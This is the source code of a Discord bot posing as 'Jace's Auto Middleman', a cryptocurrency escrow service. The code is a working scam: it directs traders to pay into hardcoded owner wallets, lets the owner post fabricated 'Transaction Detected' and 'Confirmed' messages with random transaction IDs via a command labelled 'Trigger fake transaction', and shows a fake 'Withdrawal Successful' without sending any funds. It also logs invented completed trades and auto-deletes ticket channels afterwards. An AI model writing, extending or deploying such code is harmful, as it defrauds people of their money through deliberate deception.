const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    Events, 
    PermissionFlagsBits, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle 
} = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel, Partials.Message]
});

// Config
const OWNER_ID = '1422945082746601594';
const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';

client.config = {
    TICKET_CATEGORY: null,
    MANUAL_CATEGORY: null,
    LOG_CHANNEL: null
};

client.tickets = new Map();

const isOwner = (id) => id === OWNER_ID;

// Commands
const commands = [
    {
        name: 'panel',
        description: 'Spawn middleman panel (Owner only)',
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'manual',
        description: 'Spawn manual middleman panel (Owner only)',
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'tickets',
        description: 'Set auto MM ticket category (Owner only)',
        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'manualcategory',
        description: 'Set manual MM ticket category (Owner only)',
        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'log',
        description: 'Set log channel (Owner only)',
        options: [{ name: 'channel', type: 7, description: 'Channel', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'transaction',
        description: 'Trigger fake transaction (Owner only)',
        options: [{ name: 'channelid', type: 3, description: 'Ticket channel ID', required: true }]
    },
    {
        name: 'close',
        description: 'Close current ticket'
    },
    {
        name: 'say',
        description: 'Send message as bot (Owner only)',
        options: [
            { name: 'channel', type: 7, description: 'Target channel', required: true },
            { name: 'message', type: 3, description: 'Message to send', required: true }
        ],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    }
];

client.once(Events.ClientReady, async () => {
    console.log(`✅ Bot logged in as ${client.user.tag}`);
    for (const [, guild] of client.guilds.cache) {
        try {
            await guild.commands.set(commands);
        } catch (e) {
            console.error(`Failed to register commands in ${guild.name}:`, e);
        }
    }
});

// Main Interaction Handler
client.on(Events.InteractionCreate, async (interaction) => {
    try {
        if (interaction.isChatInputCommand()) {
            await handleSlashCommand(interaction);
        } else if (interaction.isButton()) {
            await handleButton(interaction);
        } else if (interaction.isModalSubmit()) {
            await handleModal(interaction);
        }
    } catch (err) {
        console.error('Interaction error:', err);
        if (!interaction.replied && !interaction.deferred) {
            await interaction.reply({ content: '❌ An error occurred', ephemeral: true }).catch(() => {});
        }
    }
});

async function handleSlashCommand(i) {
    const { commandName, user, channel, options } = i;
    
    if (commandName === 'panel') {
        if (!isOwner(user.id)) {
            return i.reply({ content: '❌ Owner only', ephemeral: true });
        }
        
        const infoEmbed = new EmbedBuilder()
            .setTitle("Jace's Auto Middleman")
            .setDescription('• Paid Service\n• Read our ToS before using the bot: #tos-crypto')
            .setColor(0x2B2D31);
            
        const feesEmbed = new EmbedBuilder()
            .setTitle('Fees:')
            .setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**')
            .setColor(0x2B2D31);
            
        const ltcEmbed = new EmbedBuilder()
            .setTitle('Ł • Request Litecoin • Ł')
            .setColor(0x2B2D31);
            
        const ltcRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('req_ltc')
                .setLabel('Request LTC')
                .setStyle(ButtonStyle.Primary)
                .setEmoji('Ł')
        );
        
        const usdtEmbed = new EmbedBuilder()
            .setTitle('💲 • Request USDT')
            .setDescription('**[BEP-20]** • 💲\n• Network: **BSC (BEP-20)**')
            .setColor(0x2B2D31);
            
        const usdtRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('req_usdt')
                .setLabel('Request USDT [BEP-20]')
                .setStyle(ButtonStyle.Success)
                .setEmoji('💲')
        );
        
        await channel.send({ embeds: [infoEmbed, feesEmbed] });
        await channel.send({ embeds: [ltcEmbed], components: [ltcRow] });
        await channel.send({ embeds: [usdtEmbed], components: [usdtRow] });
        
        await i.reply({ content: '✅ Panel spawned', ephemeral: true });
    }
    
    else if (commandName === 'manual') {
        if (!isOwner(user.id)) {
            return i.reply({ content: '❌ Owner only', ephemeral: true });
        }
        
        const embed = new EmbedBuilder()
            .setTitle('👤 Manual Middleman Service')
            .setDescription('Manual middleman service, Please follow the rules and wait patiently')
            .setColor(0xFFA500)
            .addFields(
                { name: 'Tier 1', value: '$200 or under', inline: true },
                { name: 'Tier 2', value: '$500 and under', inline: true },
                { name: 'Tier 3', value: '$1000+', inline: true }
            );
            
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('man_t1').setLabel('Tier 1 ($200)').setStyle(ButtonStyle.Primary).setEmoji('🥉'),
            new ButtonBuilder().setCustomId('man_t2').setLabel('Tier 2 ($500)').setStyle(ButtonStyle.Secondary).setEmoji('🥈'),
            new ButtonBuilder().setCustomId('man_t3').setLabel('Tier 3 ($1000+)').setStyle(ButtonStyle.Success).setEmoji('🥇')
        );
        
        await channel.send({ embeds: [embed], components: [row] });
        await i.reply({ content: '✅ Manual panel spawned', ephemeral: true });
    }
    
    else if (commandName === 'tickets') {
        client.config.TICKET_CATEGORY = options.getString('categoryid');
        await i.reply({ content: '✅ Auto MM ticket category set', ephemeral: true });
    }
    
    else if (commandName === 'manualcategory') {
        client.config.MANUAL_CATEGORY = options.getString('categoryid');
        await i.reply({ content: '✅ Manual MM ticket category set', ephemeral: true });
    }
    
    else if (commandName === 'log') {
        client.config.LOG_CHANNEL = options.getChannel('channel').id;
        await i.reply({ content: '✅ Log channel set', ephemeral: true });
    }
    
    else if (commandName === 'transaction') {
        if (!isOwner(user.id)) {
            return i.reply({ content: '❌ Owner only', ephemeral: true });
        }
        
        const ch = await client.channels.fetch(options.getString('channelid')).catch(() => null);
        if (!ch) return i.reply({ content: '❌ Invalid channel', ephemeral: true });
        
        const t = client.tickets.get(ch.id);
        if (!t || t.status !== 'awaiting_payment') {
            return i.reply({ content: '❌ Ticket not awaiting payment', ephemeral: true });
        }
        
        const txid = Array(64).fill(0).map(() => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
        
        const detectedEmbed = new EmbedBuilder()
            .setTitle('⚠️ Transaction Detected')
            .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.')
            .addFields(
                { name: 'Transaction', value: `[${txid.slice(0,10)}...${txid.slice(-10)}](https://live.blockcypher.com/ltc/tx/${txid})` },
                { name: 'Amount Received', value: `${t.ltcAmount} LTC ($${t.amount})` },
                { name: 'Required Amount', value: `${t.ltcAmount} LTC ($${t.amount})` }
            )
            .setColor(0xFFD700);
            
        await ch.send({ embeds: [detectedEmbed] });
        await i.reply({ content: '✅ Transaction triggered, waiting 10s for confirmation...', ephemeral: true });
        
        setTimeout(async () => {
            try {
                const confirmedEmbed = new EmbedBuilder()
                    .setTitle('✅ Transaction Confirmed!')
                    .addFields(
                        { name: 'Transactions', value: `[${txid.slice(0,10)}...${txid.slice(-10)}](https://live.blockcypher.com/ltc/tx/${txid})` },
                        { name: 'Total Amount Received', value: `${t.ltcAmount} LTC ($${t.amount})` }
                    )
                    .setColor(0x00FF00);
                    
                const proceedEmbed = new EmbedBuilder()
                    .setTitle('✅ You may proceed with your trade.')
                    .setDescription(`1. <@${t.receiverId}> **Give your trader the items or payment you agreed on.**\n\n2. <@${t.senderId}> **Once you have received your items, click "Release" so your trader can claim the LTC.**`)
                    .setColor(0x00FF00);
                    
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`rel_${t.id}`).setLabel('Release').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId(`can_${t.id}`).setLabel('Cancel').setStyle(ButtonStyle.Secondary)
                );
                
                await ch.send({ embeds: [confirmedEmbed] });
                await ch.send({ content: `<@${t.senderId}> <@${t.receiverId}>`, embeds: [proceedEmbed], components: [row] });
                
                t.status = 'awaiting_release';
                t.txid = txid;
                client.tickets.set(ch.id, t);
            } catch (e) {
                console.error('Transaction confirmation error:', e);
            }
        }, 10000);
    }
    
    else if (commandName === 'close') {
        if (!i.channel.name.match(/(ltc-|usdt-|manual-)/)) {
            return i.reply({ content: '❌ Not a ticket channel', ephemeral: true });
        }
        await i.reply('🔒 Closing ticket in 5 seconds...');
        setTimeout(() => i.channel.delete().catch(() => {}), 5000);
    }
    
    else if (commandName === 'say') {
        if (!isOwner(user.id)) return i.reply({ content: '❌ Owner only', ephemeral: true });
        await options.getChannel('channel').send(options.getString('message'));
        await i.reply({ content: '✅ Message sent', ephemeral: true });
    }
}

async function handleButton(i) {
    const { customId, user, channel, guild } = i;
    
    // Request LTC/USDT - Show modal
    if (customId === 'req_ltc' || customId === 'req_usdt') {
        const modal = new ModalBuilder()
            .setCustomId(customId)
            .setTitle('Fill out the format');
            
        modal.addComponents(
            new ActionRowBuilder().addComponents(
                new TextInputBuilder()
                    .setCustomId('trader_id')
                    .setLabel("Paste Your Trader's Username or ID")
                    .setStyle(TextInputStyle.Short)
                    .setPlaceholder('e.g.: kookie.js / 693059117761429610')
                    .setRequired(true)
            ),
            new ActionRowBuilder().addComponents(
                new TextInputBuilder()
                    .setCustomId('you_giving')
                    .setLabel('What are You giving?')
                    .setStyle(TextInputStyle.Short)
                    .setRequired(true)
            ),
            new ActionRowBuilder().addComponents(
                new TextInputBuilder()
                    .setCustomId('they_giving')
                    .setLabel('What is Your Trader giving?')
                    .setStyle(TextInputStyle.Short)
                    .setRequired(true)
            )
        );
        
        await i.showModal(modal);
    }
    
    // Manual tiers
    else if (customId.startsWith('man_t')) {
        const tier = customId.replace('man_t', '');
        const limits = { '1': 200, '2': 500, '3': 1000 };
        
        if (!client.config.MANUAL_CATEGORY) {
            return i.reply({ content: '❌ Manual category not set', ephemeral: true });
        }
        
        const c = await guild.channels.create({
            name: `manual-${user.username}-t${tier}`,
            parent: client.config.MANUAL_CATEGORY,
            permissionOverwrites: [
                { id: guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }
            ]
        });
        
        const embed = new EmbedBuilder()
            .setTitle(`👤 Manual | Tier ${tier}`)
            .setDescription(`<@${user.id}>\n**Limit: $${limits[tier]}**`)
            .addFields(
                { name: 'LTC Address', value: `\`${LTC_ADDRESS}\``, inline: false },
                { name: 'Network', value: 'Litecoin', inline: true },
                { name: 'Status', value: '⏳ Waiting...', inline: true }
            )
            .setColor(0xBFBBBB);
            
        await c.send({ 
            content: `<@${user.id}>`, 
            embeds: [embed], 
            components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close').setLabel('Close').setStyle(ButtonStyle.Danger))] 
        });
        
        await i.reply({ content: `✅ Manual ticket created: ${c}`, ephemeral: true });
    }
    
    // Role selection
    else if (customId.startsWith('role_')) {
        const t = client.tickets.get(channel.id);
        if (!t) return i.reply({ content: '❌ Ticket not found', ephemeral: true });
        
        const action = customId.split('_')[1];
        
        if (action === 'reset') {
            t.senderId = null;
            t.receiverId = null;
        } 
        else if (action === 'sender') {
            if (t.senderId && t.senderId !== user.id) return i.reply({ content: '❌ Sender role already taken', ephemeral: true });
            if (t.receiverId === user.id) return i.reply({ content: '❌ You cannot be both Sender and Receiver', ephemeral: true });
            t.senderId = user.id;
            await i.reply({ content: '✅ You are now the Sender', ephemeral: true });
        } 
        else if (action === 'receiver') {
            if (t.receiverId && t.receiverId !== user.id) return i.reply({ content: '❌ Receiver role already taken', ephemeral: true });
            if (t.senderId === user.id) return i.reply({ content: '❌ You cannot be both Sender and Receiver', ephemeral: true });
            t.receiverId = user.id;
            await i.reply({ content: '✅ You are now the Receiver', ephemeral: true });
        }
        
        client.tickets.set(channel.id, t);
        
        // Update role display message
        const messages = await channel.messages.fetch({ limit: 10 });
        const roleMsg = messages.find(m => m.embeds[0]?.description?.includes('Select your role'));
        
        if (roleMsg) {
            let desc = '**Select your role**\n• **"Sender"** if you are **Sending** LTC to the bot.\n• **"Receiver"** if you are **Receiving** LTC *later* from the bot.\n\n';
            if (t.senderId) desc += `**Sender:** <@${t.senderId}>\n`;
            if (t.receiverId) desc += `**Receiver:** <@${t.receiverId}>\n`;
            
            await roleMsg.edit({
                embeds: [new EmbedBuilder().setDescription(desc).setColor(0x5865F2)],
                components: [new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`role_sender_${t.id}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
                    new ButtonBuilder().setCustomId(`role_receiver_${t.id}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
                    new ButtonBuilder().setCustomId(`role_reset_${t.id}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
                )]
            });
        }
        
        // If both selected, send confirmation
        if (t.senderId && t.receiverId) {
            const confirmEmbed = new EmbedBuilder()
                .setTitle('• Is This Information Correct?')
                .addFields(
                    { name: 'Sender', value: `<@${t.senderId}>`, inline: false },
                    { name: 'Receiver', value: `<@${t.receiverId}>`, inline: false }
                )
                .setDescription('Make sure you have selected the right role! If you didn\'t then click "Incorrect"')
                .setColor(0x5865F2);
                
            await channel.send({
                content: `<@${t.creatorId}> <@${t.traderId}>`,
                embeds: [confirmEmbed],
                components: [new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`conf_info_${t.id}`).setLabel('Correct').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId(`inc_info_${t.id}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
                )]
            });
        }
    }
    
    // Confirm info
    else if (customId.startsWith('conf_info_')) {
        const t = client.tickets.get(channel.id);
        if (!t) return;
        
        if (!t.confirmed) t.confirmed = [];
        if (t.confirmed.includes(user.id)) return i.reply({ content: '✅ Already confirmed', ephemeral: true });
        
        t.confirmed.push(user.id);
        client.tickets.set(channel.id, t);
        
        await i.reply({ content: `✅ ${user} clicked Correct`, ephemeral: false });
        
        // Both confirmed
        if (t.confirmed.includes(t.creatorId) && t.confirmed.includes(t.traderId)) {
            const embed = new EmbedBuilder()
                .setDescription('💵 **Set the amount in USD value**\n\nOnly the sender can click this button.')
                .setColor(0x5865F2);
                
            await channel.send({
                content: `<@${t.senderId}>`,
                embeds: [embed],
                components: [new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`set_amt_${t.id}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary)
                )]
            });
        }
    }
    
    else if (customId.startsWith('inc_info_')) {
        await i.reply({ content: '❌ Please state the correct trade details in chat', ephemeral: false });
    }
    
    // Set amount button
    else if (customId.startsWith('set_amt_')) {
        const t = client.tickets.get(channel.id);
        if (user.id !== t.senderId) return i.reply({ content: '❌ Only the Sender can set the amount', ephemeral: true });
        
        const modal = new ModalBuilder()
            .setCustomId('amt_modal')
            .setTitle('Set USD Amount');
            
        modal.addComponents(
            new ActionRowBuilder().addComponents(
                new TextInputBuilder()
                    .setCustomId('usd_amt')
                    .setLabel('USD Amount')
                    .setStyle(TextInputStyle.Short)
                    .setPlaceholder('30')
                    .setRequired(true)
            )
        );
        
        await i.showModal(modal);
    }
    
    // Confirm amount
    else if (customId.startsWith('conf_amt_')) {
        const t = client.tickets.get(channel.id);
        if (!t.amtConf) t.amtConf = [];
        if (t.amtConf.includes(user.id)) return i.reply({ content: '✅ Already confirmed', ephemeral: true });
        
        t.amtConf.push(user.id);
        client.tickets.set(channel.id, t);
        
        await i.reply({ content: `✅ ${user} confirmed the USD amount`, ephemeral: false });
        
        // Both confirmed amount
        if (t.amtConf.includes(t.creatorId) && t.amtConf.includes(t.traderId)) {
            t.status = 'awaiting_payment';
            client.tickets.set(channel.id, t);
            
            const paymentEmbed = new EmbedBuilder()
                .setDescription(`<@${t.senderId}> Send the LTC to the following address.`)
                .addFields(
                    { name: '📋 Payment Information', value: 'Make sure to send the **EXACT** amount in LTC.' },
                    { name: 'USD Amount', value: `$${t.amount.toFixed(2)}` },
                    { name: 'LTC Amount', value: t.ltcAmount },
                    { name: 'Payment Address', value: `\`${t.addr}\`` },
                    { name: `Current ${t.crypto} Price`, value: '$55.57' },
                    { name: '⏰ Timeout', value: 'This ticket will be closed within 20 minutes if no transaction was detected.' }
                )
                .setColor(0x5865F2);
                
            await channel.send({
                embeds: [paymentEmbed],
                components: [new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`copy_${t.id}`).setLabel('Copy Details').setStyle(ButtonStyle.Primary)
                )]
            });
            
            await channel.send({ content: `\`${t.addr}\`\n\`${t.ltcAmount}\`` });
        }
    }
    
    else if (customId.startsWith('inc_amt_')) {
        await i.reply({ content: '❌ Please set the correct amount', ephemeral: false });
    }
    
    // Release flow
    else if (customId.startsWith('rel_')) {
        const t = client.tickets.get(channel.id);
        if (user.id !== t.senderId && !isOwner(user.id)) {
            return i.reply({ content: '❌ Only the Sender can release', ephemeral: true });
        }
        
        const embed = new EmbedBuilder()
            .setTitle('⚠️ Are you sure?')
            .setDescription('Click **Confirm** to release LTC')
            .setColor(0xFFD700);
            
        await i.reply({
            embeds: [embed],
            components: [new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`conf_rel_${t.id}`).setLabel('Confirm').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`back_rel_${t.id}`).setLabel('Back').setStyle(ButtonStyle.Secondary)
            )],
            ephemeral: false
        });
    }
    
    else if (customId.startsWith('conf_rel_')) {
        const t = client.tickets.get(channel.id);
        const embed = new EmbedBuilder()
            .setTitle('💰 What\'s Your LTC Address?')
            .setDescription(`<@${t.receiverId}> Only the receiver can click this button to enter their address.`)
            .setColor(0x5865F2);
            
        await i.update({
            embeds: [embed],
            components: [new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`ent_addr_${t.id}`).setLabel('Enter Your LTC Address').setStyle(ButtonStyle.Primary)
            )]
        });
    }
    
    else if (customId.startsWith('back_rel_')) {
        await i.update({ content: '❌ Cancelled', components: [], embeds: [] });
    }
    
    else if (customId.startsWith('ent_addr_')) {
        const t = client.tickets.get(channel.id);
        if (user.id !== t.receiverId) return i.reply({ content: '❌ Only the Receiver can enter the address', ephemeral: true });
        
        const modal = new ModalBuilder()
            .setCustomId('addr_modal')
            .setTitle('Enter LTC Address');
            
        modal.addComponents(
            new ActionRowBuilder().addComponents(
                new TextInputBuilder()
                    .setCustomId('ltc_addr')
                    .setLabel('LTC Address')
                    .setStyle(TextInputStyle.Short)
                    .setPlaceholder(LTC_ADDRESS)
                    .setRequired(true)
            )
        );
        
        await i.showModal(modal);
    }
    
    // Close/Delete/Cancel buttons
    else if (customId === 'close' || customId.startsWith('can_') || customId.startsWith('del_')) {
        await i.reply('🔒 Closing...');
        await channel.delete().catch(() => {});
    }
}

async function handleModal(i) {
    const { customId, fields, user, guild, channel } = i;
    
    // Create LTC/USDT ticket
    if (customId === 'req_ltc' || customId === 'req_usdt') {
        const crypto = customId === 'req_ltc' ? 'LTC' : 'USDT';
        const addr = crypto === 'LTC' ? LTC_ADDRESS : USDC_ADDRESS;
        
        const traderId = fields.getTextInputValue('trader_id').replace(/[<@!>]/g, '');
        const youGive = fields.getTextInputValue('you_giving');
        const theyGive = fields.getTextInputValue('they_giving');
        
        if (!client.config.TICKET_CATEGORY) {
            return i.reply({ content: '❌ Auto MM category not set. Use /tickets first.', ephemeral: true });
        }
        
        let trader;
        try {
            trader = await guild.members.fetch(traderId);
        } catch {
            return i.reply({ content: '❌ Invalid trader ID. User must be in this server.', ephemeral: true });
        }
        
        if (traderId === user.id) {
            return i.reply({ content: '❌ You cannot trade with yourself', ephemeral: true });
        }
        
        const c = await guild.channels.create({
            name: `${crypto.toLowerCase()}-${user.username}-${trader.user.username}`.substring(0, 100),
            parent: client.config.TICKET_CATEGORY,
            permissionOverwrites: [
                { id: guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                { id: traderId, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }
            ]
        });
        
        const id = Date.now().toString();
        const t = {
            id,
            creatorId: user.id,
            traderId,
            youGive,
            theyGive,
            crypto,
            addr,
            senderId: null,
            receiverId: null,
            confirmed: [],
            amount: null,
            ltcAmount: null,
            amtConf: [],
            status: 'role_selection'
        };
        client.tickets.set(c.id, t);
        
        // Welcome embed
        const welcomeEmbed = new EmbedBuilder()
            .setTitle('👋 Jace\'s Auto Middleman Service')
            .setDescription('Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.\nBy using this bot, you agree to our ToS #tos-crypto.')
            .setColor(0x5865F2)
            .addFields(
                { name: `${user.username}'s side:`, value: youGive, inline: true },
                { name: `${trader.user.username}'s side:`, value: theyGive, inline: true }
            );
            
        await c.send({
            content: `${user} ${trader}`,
            embeds: [welcomeEmbed],
            components: [new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`del_${id}`).setLabel('Delete Ticket').setStyle(ButtonStyle.Danger)
            )]
        });
        
        // Role selection
        const roleEmbed = new EmbedBuilder()
            .setDescription('**Select your role**\n• **"Sender"** if you are **Sending** LTC to the bot.\n• **"Receiver"** if you are **Receiving** LTC *later* from the bot.')
            .setColor(0x5865F2);
            
        await c.send({
            embeds: [roleEmbed],
            components: [new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`role_sender_${id}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId(`role_receiver_${id}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId(`role_reset_${id}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
            )]
        });
        
        await i.reply({ content: `✅ Ticket created: ${c}`, ephemeral: true });
    }
    
    // Amount modal
    else if (customId === 'amt_modal') {
        const t = client.tickets.get(channel.id);
        const amt = parseFloat(fields.getTextInputValue('usd_amt'));
        
        if (isNaN(amt) || amt <= 0) {
            return i.reply({ content: '❌ Invalid amount', ephemeral: true });
        }
        
        t.amount = amt;
        t.ltcAmount = (amt / 55.57).toFixed(8);
        client.tickets.set(channel.id, t);
        
        const embed = new EmbedBuilder()
            .setDescription(`**USD amount set to $${amt.toFixed(2)}**\n\nPlease confirm the USD amount.`)
            .setColor(0x5865F2);
            
        await i.reply({
            embeds: [embed],
            components: [new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`conf_amt_${t.id}`).setLabel('Correct').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`inc_amt_${t.id}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
            )]
        });
    }
    
    // Address modal (withdrawal)
    else if (customId === 'addr_modal') {
        const t = client.tickets.get(channel.id);
        const addr = fields.getTextInputValue('ltc_addr');
        
        if (!addr.match(/^(ltc1|L|M)/)) {
            return i.reply({ content: '❌ Invalid LTC address', ephemeral: true });
        }
        
        const txid = Array(64).fill(0).map(() => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
        
        await i.reply({ embeds: [new EmbedBuilder().setDescription('⏳ **Sending...**').setColor(0x5865F2)] });
        
        setTimeout(async () => {
            try {
                const successEmbed = new EmbedBuilder()
                    .setTitle('✅ Withdrawal Successful')
                    .setDescription('Fee sent to Index 1 (Fee Wallet)')
                    .addFields(
                        { name: 'Transaction', value: `[${txid.slice(0,10)}...${txid.slice(-8)}](https://live.blockcypher.com/ltc/tx/${txid})` },
                        { name: 'Amount Sent', value: `${t.ltcAmount} LTC ($${t.amount})` },
                        { name: 'Fee', value: '0.0001 LTC sent to Index 1' }
                    )
                    .setColor(0x00FF00);
                    
                await i.editReply({
                    embeds: [successEmbed],
                    components: [new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('close').setLabel('🔒 Close Ticket').setStyle(ButtonStyle.Danger)
                    )]
                });
                
                // Log to channel
                if (client.config.LOG_CHANNEL) {
                    const logCh = await client.channels.fetch(client.config.LOG_CHANNEL).catch(() => null);
                    if (logCh) {
                        await logCh.send({
                            embeds: [new EmbedBuilder()
                                .setTitle('• Trade Completed')
                                .setDescription(`**${t.ltcAmount} LTC** ($${t.amount.toFixed(2)} USD)`)
                                .addFields(
                                    { name: 'Sender', value: 'Anonymous' },
                                    { name: 'Receiver', value: 'Anonymous' },
                                    { name: 'Transaction ID', value: `[${txid.slice(0,10)}...${txid.slice(-8)}](https://live.blockcypher.com/ltc/tx/${txid})` }
                                )
                                .setColor(0x5865F2)
                                .setTimestamp()
                            ]
                        });
                    }
                }
                
                // Auto close after 2 min
                setTimeout(() => channel.delete().catch(() => {}), 120000);
                
            } catch (e) {
                console.error('Withdrawal error:', e);
            }
        }, 2000);
    }
}

client.login(process.env.DISCORD_TOKEN);
